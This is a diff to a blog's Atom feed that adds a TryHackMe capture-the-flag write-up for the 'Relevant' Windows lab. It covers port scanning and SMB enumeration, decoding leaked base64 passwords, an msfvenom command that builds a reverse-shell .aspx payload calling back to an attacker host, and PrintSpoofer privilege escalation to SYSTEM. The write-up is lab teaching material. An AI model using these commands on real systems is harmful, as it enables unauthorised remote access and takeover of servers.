@@ -2,13 +2,260 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://ovelny.sh/">
   <id>https://ovelny.sh/</id>
   <title>ovelny</title>
-  <updated>2020-04-14T22:00:00Z</updated>
+  <updated>2021-03-11T23:00:00Z</updated>
   <link rel="alternate" href="https://ovelny.sh/" type="text/html"/>
   <link rel="self" href="https://ovelny.sh/atom.xml" type="application/atom+xml"/>
   <author>
     <name>ovelny</name>
     <uri>https://ovelny.sh</uri>
   </author>
+  <entry>
+    <id>tag:ovelny.sh,2021-03-11:/blog/tryhackme-writeup-relevant/</id>
+    <title type="html">TryHackMe writeup: Relevant</title>
+    <published>2021-03-11T23:00:00Z</published>
+    <updated>2021-03-11T23:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/tryhackme-writeup-relevant/" type="text/html"/>
+    <content type="html">&lt;h2&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Relevant is a TryHackMe room designed to simulate a black box penetration test. As such, no information is provided about the target whatsoever, with the exception of its scope. As proof of exploitation, two flags must be secured:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;User.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Root.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;While the target has several vulnerabilities that can be exploited, this write-up will only focus on one of them. Let&amp;#39;s begin!&lt;/p&gt;
+
+&lt;h2&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;As always, a good point to start with active reconnaissance is to enumerate open ports and services on our target. Let&amp;#39;s begin with &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;As a start, we will use &lt;code&gt;nmap&lt;/code&gt; with the &lt;code&gt;-sC&lt;/code&gt; and &lt;code&gt;-sV&lt;/code&gt; flags on our target. As a reminder, these scans will do the following:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt;: Equivalent to &lt;code&gt;--script=default&lt;/code&gt;. Will run default scripts on found ports/services.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt;: Probe open ports to determine service/version info.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let&amp;#39;s also enumerate all ports with &lt;code&gt;-p-&lt;/code&gt; for good measure:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-sC&lt;/span&gt; &lt;span class="nt"&gt;-sV&lt;/span&gt; &lt;span class="nt"&gt;-p-&lt;/span&gt; 10.10.126.101
+Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 13:48 CET
+Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.126.101
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.029s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;
+Not shown: 65527 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-03-01T12:51:53+00:00
+| ssl-cert: Subject: &lt;span class="nv"&gt;commonName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Relevant
+| Not valid before: 2021-02-28T12:48:34
+|_Not valid after:  2021-08-30T12:48:34
+|_ssl-date: 2021-03-01T12:52:32+00:00&lt;span class="p"&gt;;&lt;/span&gt; 0s from scanner time.
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And here are the host script results ran against these findings:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Host script results:
+|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 &lt;span class="o"&gt;(&lt;/span&gt;Windows Server 2016 Standard Evaluation 6.3&lt;span class="o"&gt;)&lt;/span&gt;
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT&lt;span class="se"&gt;\x&lt;/span&gt;00
+|   Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;00
+|_  System &lt;span class="nb"&gt;time&lt;/span&gt;: 2021-03-01T04:51:56-08:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   &lt;span class="nb"&gt;date&lt;/span&gt;: 2021-03-01T12:51:54
+|_  start_date: 2021-03-01T12:48:50
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We&amp;#39;re getting a few interesting hints so far for exploitation, and also two HTTP services opened on port 80 and 49663. Let&amp;#39;s check where this might lead us.&lt;/p&gt;
+
+&lt;h3&gt;Websites / web services&lt;/h3&gt;
+
+&lt;p&gt;Both of the HTTP services lead us to the Microsoft IIS server default page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/dc13dcea81e8421ab8c5e29d91ed2c32.png" alt="3529929dcd77fb973e8eb515aa5d845b.png"&gt;&lt;/p&gt;
+
+&lt;p&gt;Dirsearch results suggest something fishy. Why would we have a directory traversal vulnerability for /etc/passwd on a windows server? Looks like we might encounter some red herrings on this target.&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152/
+
+Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-17-13.txt
+
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:13] Starting:
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:14] 403 -  312B  - /%2e%2e//google.com
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:18] 403 -    2KB - /Trace.axd
+&lt;span class="o"&gt;[&lt;/span&gt;18:17:19] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd
+
+Task Completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Port 49663 doesn&amp;#39;t lead to interesting results either, as the few additional pages can&amp;#39;t be exploited for anything meaningful:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152:49663/
+
+Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-19-38.txt
+
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:38] Starting:
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:39] 403 -  312B  - /%2e%2e//google.com
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:54] 403 -    2KB - /Trace.axd
+&lt;span class="o"&gt;[&lt;/span&gt;18:19:55] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd
+&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 200 -    0B  - /aspnet_client/
+&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 301 -  163B  - /aspnet_client  -&amp;gt;  http://10.10.32.152:49663/aspnet_client/
+
+Task Completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As we saw port 445 being open, samba naturally comes next for enumeration.&lt;/p&gt;
+
+&lt;h3&gt;SMB enumeration&lt;/h3&gt;
+
+&lt;p&gt;At first, nmap scripts targeting SMB protocols seem to lead us to something juicy: perhaps this target is vulnerable to EternalBlue!&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-p&lt;/span&gt; 445 &lt;span class="nt"&gt;--script&lt;/span&gt; smb-protocols 10.10.32.152
+Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 18:28 CET
+Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.32.152
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.044s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols:
+|   dialects:
+|     NT LM 0.12 &lt;span class="o"&gt;(&lt;/span&gt;SMBv1&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;dangerous, but default]
+|     2.02
+|     2.10
+|     3.00
+|     3.02
+|_    3.11
+
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: 1 IP address &lt;span class="o"&gt;(&lt;/span&gt;1 host up&lt;span class="o"&gt;)&lt;/span&gt; scanned &lt;span class="k"&gt;in &lt;/span&gt;8.57 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;That would be too good to be true right? Well, that&amp;#39;s because it is. SMB1 is disabled:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient &lt;span class="nt"&gt;-N&lt;/span&gt; &lt;span class="nt"&gt;-L&lt;/span&gt; &lt;span class="se"&gt;\\\\&lt;/span&gt;10.10.32.152
+
+        Sharename       Type      Comment
+        &lt;span class="nt"&gt;---------&lt;/span&gt;       &lt;span class="nt"&gt;----&lt;/span&gt;      &lt;span class="nt"&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;         Disk      Remote Admin
+        C&lt;span class="nv"&gt;$ &lt;/span&gt;             Disk      Default share
+        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;           IPC       Remote IPC
+        nt4wrksv        Disk
+SMB1 disabled &lt;span class="nt"&gt;--&lt;/span&gt; no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;However, the &lt;code&gt;nt4wrksv&lt;/code&gt; share is quite unusual and seem to be worth exploring.&lt;/p&gt;
+
+&lt;h2&gt;Relevant findings for exploitation&lt;/h2&gt;
+
+&lt;p&gt;So far, our main lead is exploiting samba and maybe find some pieces of information that might lead us to a reverse shell.&lt;/p&gt;
+
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Since SMB1 is disabled, EternalBlue is not even worth exploring for this target. Let&amp;#39;s connect to &lt;code&gt;nt4wrksv&lt;/code&gt; with an anonymous connection:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient //10.10.143.157/nt4wrksv
+Enter WORKGROUP&lt;span class="se"&gt;\o&lt;/span&gt;velny&lt;span class="s1"&gt;'s password:
+Try "help" to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We quickly get our eyes on a &lt;code&gt;passwords.txt&lt;/code&gt; file, immediately accessible on this share with &lt;code&gt;more passwords.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Base64 encoded... easy fix, let&amp;#39;s decode those strings:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Qm9iIC0gIVBAJCRXMHJEITEyMw=="&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
+Bob - &lt;span class="o"&gt;!&lt;/span&gt;P@&lt;span class="nv"&gt;$$&lt;/span&gt;W0rD!123
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk"&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
+Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Connecting to SMB with those credentials works, but the permissions for those accounts are similar to anonymous connections. Disappointing. Bill and Bob shall not help us any further, as this seems to be another red herring.&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbmap &lt;span class="nt"&gt;-u&lt;/span&gt; Bob &lt;span class="nt"&gt;-p&lt;/span&gt; &lt;span class="s1"&gt;'!P@$$W0rD!123'&lt;/span&gt; &lt;span class="nt"&gt;-H&lt;/span&gt; 10.10.143.157
+&lt;span class="o"&gt;[&lt;/span&gt;+] IP: 10.10.143.157:445       Name: 10.10.143.157
+        Disk                                                    Permissions     Comment
+        &lt;span class="nt"&gt;----&lt;/span&gt;                                                    &lt;span class="nt"&gt;-----------&lt;/span&gt;     &lt;span class="nt"&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
+        C&lt;span class="nv"&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
+        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
+        nt4wrksv                                                READ, WRITE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;After some additional attempts on SMB, I gave up to focus on web services yet again. Surely there has to be something more about them...&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/36f9785c2800427887d357e058a5172c.png" alt="dfdaa88880bb3fa70f988bf1a7c81068.png"&gt;&lt;/p&gt;
+
+&lt;p&gt;And there is! Turns out all of &lt;code&gt;nt4wrksv&lt;/code&gt; contents are directly accessible through HTTP on port 49663. We might be able to get a reverse shell exactly the same way.&lt;/p&gt;
+
+&lt;p&gt;Since those web services are all powered by IIS servers, &lt;code&gt;.aspx&lt;/code&gt; ought to be our best option as payload output:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;msfvenom &lt;span class="nt"&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.9.186.16 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4444 &lt;span class="nt"&gt;-f&lt;/span&gt; aspw &lt;span class="nt"&gt;-o&lt;/span&gt; hacky.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then upload &lt;code&gt;hacky.aspx&lt;/code&gt; to the nt4wrksv share with &lt;code&gt;get hacky.aspx&lt;/code&gt; in SMB and execute the payload through HTTP (http://:49663/nt4wrksv/hacky.aspx), instantly granting us a shell to our target and access to the output of &lt;code&gt;User.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Enumerating privileges on our current user instantly shows us how we will escalate our privileges to &lt;code&gt;SYSTEM&lt;/code&gt;, since having &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; enabled instantly makes this box vulnerable to PrintSpoofer64 (&lt;a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):" rel="nofollow"&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/6b066a4a4d9b4736bbe677f905f04140.png" alt="bd810e6c5c039845840410b8f7e1d4e0.png"&gt;&lt;/p&gt;
+
+&lt;h2&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Downloading &lt;code&gt;PrintSpoofer64.exe&lt;/code&gt; was instantly doable on target&amp;#39;s default location.&lt;/p&gt;
+
+&lt;p&gt;As always, making a quick and dirty HTTP server on our machine with &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt; works wonder.&lt;/p&gt;
+
+&lt;p&gt;All that is left for us is to run the executable with &lt;code&gt;-i -c powershell&lt;/code&gt; flags enabled, so we can get an interactive powershell session as &lt;code&gt;SYSTEM&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/ca94fc0f11f340d8b45034ff083cafae.png" alt="f8780d993d9aa978ab97e75dddce1383.png"&gt;&lt;/p&gt;
+
+&lt;p&gt;Getting &lt;code&gt;Root.txt&lt;/code&gt; output is now in our hands.&lt;/p&gt;
+
+&lt;h2&gt;Summary&lt;/h2&gt;
+
+&lt;p&gt;This target was a nice demonstration of rabbit holes and red herrings that might be encountered during pentests. Getting clues that are either too obvious or too intricate is often a good sign that something dubious might be happening behind the scenes.&lt;/p&gt;
+</content>
+  </entry>
   <entry>
     <id>tag:ovelny.sh,2020-04-14:/blog/hack-the-box-writeup-nibbles/</id>
     <title type="html">Hack The Box writeup: Nibbles</title>
